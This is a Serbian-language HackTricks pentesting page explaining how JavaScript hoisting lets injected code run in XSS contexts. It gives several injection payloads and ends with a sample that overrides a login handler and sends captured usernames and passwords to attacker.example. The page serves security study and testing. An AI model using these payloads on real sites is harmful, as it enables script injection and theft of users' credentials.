# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

U JavaScript jeziku opisuje se mehanizam poznat kao **Hoisting** pri kojem se deklaracije varijabli, funkcija, klasa ili import-a konceptualno podižu na vrh njihovog opsega pre nego što se kod izvrši. Ovaj proces automatski obavlja JavaScript engine, koji prolazi kroz skriptu u više prolaza.

Tokom prvog prolaza, engine parsira kod da proveri sintaksne greške i transformiše ga u apstraktno sintaksno stablo. Ova faza uključuje hoisting, proces gde se određene deklaracije pomeraju na vrh execution context-a. Ako je faza parsiranja uspešna, što znači da nema sintaksnih grešaka, izvršenje skripte se nastavlja.

Važno je razumeti da:

1. Skripta mora biti bez sintaksnih grešaka da bi došlo do izvršenja. Sintaksna pravila moraju biti striktno poštovana.
2. Pozicija koda unutar skripte utiče na izvršenje zbog hoistinga, iako se izvršeni kod može razlikovati od njegove tekstualne reprezentacije.

#### Tipovi hoistinga

Na osnovu informacija sa MDN-a, postoje četiri različita tipa hoistinga u JavaScriptu:

1. **Value Hoisting**: Omogućava upotrebu vrednosti promenljive unutar njenog opsega pre linije njene deklaracije.
2. **Declaration Hoisting**: Dozvoljava referenciranje promenljive unutar njenog opsega pre deklaracije bez izazivanja `ReferenceError`, ali vrednost promenljive će biti `undefined`.
3. Ovaj tip menja ponašanje unutar svog opsega jer je promenljiva deklarisana pre svoje stvarne linije deklaracije.
4. Sporedni efekti deklaracije dešavaju se pre nego što se ostatak koda koji je sadrži evaluira.

Detaljno, function declarations pokazuju ponašanje tipa 1 hoistinga. Ključna reč `var` demonstrira ponašanje tipa 2. Leksičke deklaracije, koje uključuju `let`, `const` i `class`, pokazuju ponašanje tipa 3. Na kraju, `import` izjave su jedinstvene po tome što su hoistovane sa ponašanjem tipa 1 i tipa 4.

## Scenariji

Dakle, ako imate scenarije gde možete ubaciti JS kod nakon što se koristi nedeklarisan objekat, možete ispraviti sintaksu deklarisanjem tog objekta (tako će se vaš kod izvršiti umesto da baci grešku):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Više scenarija
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting za zaobilaženje rukovanja izuzecima

Kada je sink omotan u `try { x.y(...) } catch { ... }`, **ReferenceError** će zaustaviti izvršavanje pre nego što se tvoj payload pokrene. Možeš prethodno deklarisati nedostajući identifikator tako da poziv preživi i tvoj injected expression izvrši prvi:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` se podiže (hoisted) pre evaluacije, pa parser više ne baca grešku za `x.y(...)`; `prompt()` se izvršava pre nego što je `y` razrešeno, a nakon što se tvoj kod izvrši baci se `TypeError`.

### Sprečite kasnije deklaracije zaključavanjem imena pomoću const

Ako možete izvršiti kod pre nego što se na vrhu parsira `function foo(){...}`, deklarisanje leksičke promenljive istog imena (npr. `const foo = ...`) će sprečiti kasniju deklaraciju funkcije da ponovo veže taj identifikator. Ovo se može zloupotrebiti u RXSS da bi se preuzeli kritični handlers definisani kasnije na strani:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Notes
- Ovo se oslanja na redosled izvršavanja i globalni (top-level) scope.
- Ako se vaš payload izvršava unutar `eval()`, imajte na umu da su `const/let` unutar `eval` blok-scoped i neće kreirati globalne binding-e. Ubacite novi `<script>` element sa kodom koji uspostavlja pravi globalni `const`.

### Dynamic import() with user-controlled specifiers

Server-side rendered aplikacije ponekad prosleđuju korisnički input u `import()` da bi lazy-load-ovale komponente. Ako je prisutan loader kao `import-in-the-middle`, iz specifier-a se generišu wrapper moduli. Hoisted import evaluacija preuzima i izvršava modul koji kontroliše napadač pre nego što sledeće linije budu izvršene, omogućavajući RCE u SSR kontekstima (see CVE-2023-38704).

### Tooling

Moderni skeneri su počeli da dodaju eksplicitne hoisting payload-e. **KNOXSS v3.6.5** navodi "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" i "Hoisting Override" test case-ove; pokretanje protiv RXSS konteksta koji bacaju `ReferenceError`/`TypeError` brzo izbacuje kandidate za hoist-based gadget-e.

## References

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
